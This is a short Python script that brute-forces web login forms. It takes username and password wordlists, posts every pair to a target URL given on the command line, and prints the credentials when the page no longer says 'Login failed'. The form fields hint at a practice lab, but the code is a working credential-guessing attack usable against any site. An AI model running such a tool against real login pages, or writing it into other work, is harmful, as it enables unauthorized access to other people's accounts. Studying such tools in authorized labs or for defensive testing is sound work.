import requests, optparse

data_dict = {"username": "", "password":"", "Login":"submit"} #you have change dict according to the form

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-p", "--pass_wordlist", dest="pass_wordlist", help="Password Wordlist")
    parser.add_option("-u", "--user_wordlist", dest="user_wordlist", help="Username Wordlist")
    parser.add_option("-t", "--target_url", dest="target_url", help="Target Website")
    (options, arguments) = parser.parse_args()

    if not options.target_url:
        parser.error("Please input Target Website, use --help for more info.")
    elif not options.pass_wordlist:
        parser.error("Please specify password wordlist, use --help for more info.")
    elif not options.user_wordlist:
        parser.error("Please specify username wordlist, use --help for more info.")
    return options

def check_password(target_url, pass_wordlist):
    with open(pass_wordlist, "r") as password:
        for line in password:
            passw = line.strip()
            data_dict["password"] = passw
            response = requests.post(target_url, data=data_dict)
            if "Login failed" not in response.content.decode(errors='ignore'):
                print("[+] Got the Credential.")
                print("[+] Username --> " + data_dict["username"])
                print("[+] Password --> " + passw)
                exit()

def username(target_url, user_wordlist, pass_wordlist):
    with open(user_wordlist, "r") as usernm:
        for user in usernm:
            username = user.strip()
            data_dict["username"] = username
            check_password(target_url, pass_wordlist)

    print("[+] Reached end of line.")

options = get_arguments()

try:
    username(options.target_url, options.user_wordlist, options.pass_wordlist)
except KeyboardInterrupt:
    print("[-] Detecting CTRL+C")
    print("[-] Aborting")